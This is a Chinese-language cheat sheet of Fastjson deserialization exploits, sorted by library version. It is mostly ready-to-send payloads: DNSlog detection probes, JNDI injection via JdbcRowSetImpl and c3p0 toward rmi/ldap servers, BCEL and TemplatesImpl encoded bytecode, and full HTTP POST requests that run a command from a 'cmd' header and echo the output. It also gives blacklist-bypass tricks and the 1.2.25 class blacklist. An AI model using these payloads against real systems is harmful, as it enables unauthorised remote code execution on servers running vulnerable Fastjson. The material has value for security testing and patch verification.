
# Fastjson
Fastjson姿势技巧集合

## 说明
目前还在整理中，还未排版。

## 探测



fastjson >1.2.48

```java
{"@type":"java.net.InetAddress","val":"dnslog"}
```

fastjson >1.2.68

```java
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
{{"@type":"java.net.URL","val":"dnslog"}:"aaa"}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}
Set[{"@type":"java.net.URL","val":"http://dnslog"}]
Set[{"@type":"java.net.URL","val":"http://dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
{{"@type":"java.net.URL","val":"http://dnslog"}:0
```



## 各版本利用

除了考虑Fastjson版本，还得考虑JDK版本，中间件版本，第三方依赖版本。



JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本<=6u141、7u131、8u121，基于LDAP利用的JDK版本<=6u211、7u201、8u191。（更高版本也有绕过）  
更高版本绕过可用https://github.com/veracode-research/rogue-jndi



1. jndi
   1. JdbcRowSetImpl
   2. C3p0#JndiRefForwardingDataSource
   3. JndiDataSourceFactory
2. bcel
   1. tomcat#dbcp
   2. ibatis
3. TemplatesImpl

----



### Fastjson 1.2.22-1.2.24



JdbcRowSetImpl

```java
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}
```



c3p0.JndiRefForwardingDataSource

JdbcRowSetImpl无法成功可以一试

```java
{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"rmi://127.0.0.1:1099/badClassName", "loginTimeout":0}
```



bcel

可用于解决不出网利用。
需要注意在Java 8u251以后，bcel类被删除。

tomcat7

org.apache.tomcat.dbcp.dbcp.BasicDataSource

tomcat8及其以后

org.apache.tomcat.dbcp.dbcp2.BasicDataSource



Poc

```java
{
    {
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "x"
}
```



exp

执行命令回显.

```java
POST /json HTTP/1.1
Host: 127.0.0.1:9092
Content-Type: application/json
cmd: whoami
Content-Length: 3327

{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"
        }
    }: "x"
}
```



1.2.33 <= fastjson <= 1.2.47

```java
POST /json HTTP/1.1
Host: 127.0.0.1:9092
Content-Type: application/json
cmd: whoami
Content-Length: 3647

{
    "xx":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"
            }
        } : "xxx"
    }
}

```



1.2.33<=fastjson<=12.36

```java
{
    "name":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL..."
            }
        } : "ddd"
    }
}
```

1.2.37<=fastjson<=1.2.47

```java
{
    "name":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "y": {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$..",

                     "$ref": "$.x.y.c.connection"
            }
        }
    }
}
```



其他

```java
{
  "@type": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource",
  "key": {
    "@type": "java.lang.Class",
    "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
  },
  "driverClassLoader": {
    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
  },
  "driver": "$$BCEL$$xxxxxxx"
}
```







TemplatesImpl

利用条件苛刻，可用于解决不出网利用。

需要调用`parseObject()`方法时，加入Feature.SupportNonPublicField参数。

  _bytecodes要进行base64编码

```java
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg=="],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}
```



c3p0#WrapperConnectionPoolDataSource

可用于解决不出网利用。

fastjson <1.2.47

利用c3p0二次反序列化 cc payload到达回显。

```java
POST /json HTTP/1.1
Host: 127.0.0.1:8999
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
cmd: dir
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 8925

{"e":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"f":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;"}}

```







### Fastjson 1.2.25-1.2.41

1.2.25后将TypeUtils.loadClass替换为checkAutoType()函数，增加了黑名单和白名单。

把autoTypeSupport默认为False。

当autoTypeSupport为False时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。

当autoTypeSupport为True时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。

1.2.25黑名单

```java
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```



exp

条件需要开启autotype

类名前面加了一个L，后面加一个;可以绕过黑名单

```java
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://localhost:1389/badNameClass", "autoCommit":true}
```



### Fastjson 1.2.25-1.2.42

从1.2.42版本开始,把之前的明文黑名单，改为hash黑名单。

如下大佬整理的

https://github.com/LeadroyaL/fastjson-blacklist



exp

条件需要开启autotype

双写绕过

```java
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://localhost:1389/badNameClass", "autoCommit":true}
```



